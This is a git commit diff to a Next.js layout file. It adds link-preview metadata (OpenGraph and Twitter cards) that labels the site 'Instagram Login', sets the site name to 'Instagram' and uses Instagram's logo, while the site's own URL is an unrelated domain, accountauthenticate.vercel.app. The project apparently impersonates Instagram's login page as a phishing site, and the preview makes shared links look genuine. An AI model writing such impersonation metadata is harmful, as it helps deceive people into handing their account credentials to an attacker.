fb04a36c23eb9fbe5b340d453333d092c5dbf0b7
Ali Eltouny <Eltounyali2006@gmail.com>
2025-06-17 07:34:01 +0300

    Added Link Preview

--- src/app/layout.tsx
+++ src/app/layout.tsx
@@ -10,6 +10,28 @@ export const metadata: Metadata = {
   icons: {
     icon: '/favicon.ico?v=2',  // ?v=2 forces a fresh load
   },
+  openGraph: {
+    title: 'Instagram Login',
+    description: 'Log in to Instagram to connect with friends and share your moments',
+    url: 'https://accountauthenticate.vercel.app',
+    siteName: 'Instagram',
+    images: [
+      {
+        url: 'https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png',
+        width: 800,
+        height: 600,
+        alt: 'Instagram Logo',
+      },
+    ],
+    locale: 'en_US',
+    type: 'website',
+  },
+  twitter: {
+    card: 'summary_large_image',
+    title: 'Instagram Login',
+    description: 'Log in to Instagram to connect with friends and share your moments',
+    images: ['https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png'],
+  },
 };
 
 export default function RootLayout({
